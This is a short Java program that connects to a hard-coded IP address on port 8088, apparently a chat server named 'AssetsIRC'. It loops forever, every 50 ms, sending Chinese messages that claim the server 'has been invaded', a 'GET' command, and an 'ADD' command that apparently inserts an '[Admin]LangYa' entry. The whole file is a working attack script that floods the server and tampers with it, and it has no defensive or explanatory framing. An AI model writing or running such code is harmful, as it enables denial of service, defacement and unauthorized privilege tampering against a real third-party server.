package cn.langya;

import java.io.*;
import java.net.Socket;

/**
 * @author LangYa
 * @since 2024/6/9 下午1:30
 */

public class Main {
    public static void main(String[] args) {

        String hostName = "47.103.29.73";
        int portNumber = 8088;

        try (Socket echoSocket = new Socket(hostName, portNumber);
             PrintWriter out = new PrintWriter(new OutputStreamWriter(echoSocket.getOutputStream(), "UTF-8"), true);
             BufferedReader in = new BufferedReader(new InputStreamReader(echoSocket.getInputStream(), "UTF-8")))
        {
            while (true) {
                out.println("AssetsIRC服务器已被狼牙神入侵? 狼牙 development CHAT");
                Thread.sleep(50);
                out.println( "AssetsIRC服务器已被狼牙神入侵 [Admin]LangYa [Admin]LangYa CHAT");
                Thread.sleep(50);
                out.println("GET");
                Thread.sleep(50);
                out.println("狼牙神 [Admin]LangYa ADD");
                System.out.println("收到的消息: " + in.readLine());
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
